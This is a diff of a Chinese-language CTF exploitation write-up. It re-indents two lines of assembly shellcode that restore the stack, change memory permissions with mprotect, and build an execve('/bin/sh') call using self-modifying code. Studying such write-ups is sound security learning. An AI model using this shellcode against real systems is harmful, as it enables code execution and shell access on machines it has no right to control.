@@ -63,7 +63,7 @@ p.interactive()
 ## 恢复栈+调用mprotect改权限
 
 ```assembly
-mov rbp, 0x404500		;栈底恢复
+	mov rbp, 0x404500		;栈底恢复
     mov rsp, rbp			;rbp赋给rsp，恢复栈顶
     lea r15, [rip+0xe00]	;这里如果动调过会发现rip被保留了（其实看ida的汇编码也能看出来），就拿rip做传递栈指针
     sub r15, 0xe16			;额外减0x16，退回最开始的地址（之前总共0x16字节的汇编程序）
@@ -83,7 +83,7 @@ mov rbp, 0x404500		;栈底恢复
 这里构造了`execve("/bin/sh",["sh",NULL],NULL)`
 
 ```assembly
-mov si, word ptr [r15 + 0x100]	;r15的值+0x100，赋给si（rsi，16位模式)
+	mov si, word ptr [r15 + 0x100]	;r15的值+0x100，赋给si（rsi，16位模式)
     add si, 0x101					;再将si加上0x101
     mov word ptr [r15 + 0x100], si	;修改后的si存给r15+0x100的内存位置
     /*这里是为了给后面syscall找个确定位置，顺便自加一*/
